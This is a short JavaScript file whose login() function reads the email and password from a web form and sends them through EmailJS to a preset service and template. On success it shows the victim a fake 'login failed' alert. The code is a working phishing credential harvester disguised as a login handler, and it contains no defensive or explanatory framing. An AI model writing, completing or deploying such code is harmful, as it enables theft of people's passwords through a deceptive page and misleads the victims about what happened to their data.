function login() {

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    const serviceID = "service_dlzmuvo";   // 👈 EXACT from dashboard
    const templateID = "template_lj7q04l"; // 👈 your template id

    const params = {
        customer_email: email,
        password: password
    };

    emailjs.send(serviceID, templateID, params)
        .then(function (response) {
            alert("login failed please try again later!");
            console.log("SUCCESS", response);
        })
        .catch(function (error) {
            alert("Failed to login.");
            console.log("ERROR", error);
        });
}

